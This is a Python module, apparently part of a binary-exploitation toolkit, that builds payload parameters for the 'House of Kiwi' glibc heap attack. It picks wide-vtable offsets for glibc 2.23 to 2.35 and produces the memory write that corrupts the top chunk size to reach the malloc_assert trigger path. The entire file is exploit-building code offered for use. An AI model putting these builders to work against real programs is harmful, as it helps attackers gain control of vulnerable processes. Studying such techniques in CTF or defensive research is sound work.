"""House of Kiwi trigger payload builders."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


@dataclass(frozen=True)
class KiwiPlan:
    version: str
    top_size: int
    wide_vtable_offset: int


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def _wide_vtable_offset(version: str) -> int:
    if version in {f"2.{minor}" for minor in range(23, 30)}:
        return 0x130
    if version == "2.30":
        return 0xF0
    if version in {f"2.{minor}" for minor in range(31, 36)}:
        return 0xE0
    raise ValueError("Kiwi supports glibc 2.23 through 2.35")


def build_house_of_kiwi(*, version: str, top_size: int = 0x21) -> KiwiPlan:
    """Return Kiwi trigger parameters for the old malloc_assert path."""

    if top_size < 0x20 or top_size & 0xF != 1:
        raise ValueError("top_size must be aligned and keep PREV_INUSE")

    return KiwiPlan(
        version=version,
        top_size=top_size,
        wide_vtable_offset=_wide_vtable_offset(version),
    )


def build_house_of_kiwi_payload(
    *,
    version: str,
    top_size_addr: int,
    top_size: int = 0x21,
) -> tuple[MemoryWrite, ...]:
    """Build the top-size overwrite used to trigger old Kiwi."""

    _check_uint64("top_size_addr", top_size_addr)
    plan = build_house_of_kiwi(version=version, top_size=top_size)
    return (
        MemoryWrite(
            top_size_addr,
            _pack64(plan.top_size),
            "top chunk size",
        ),
    )
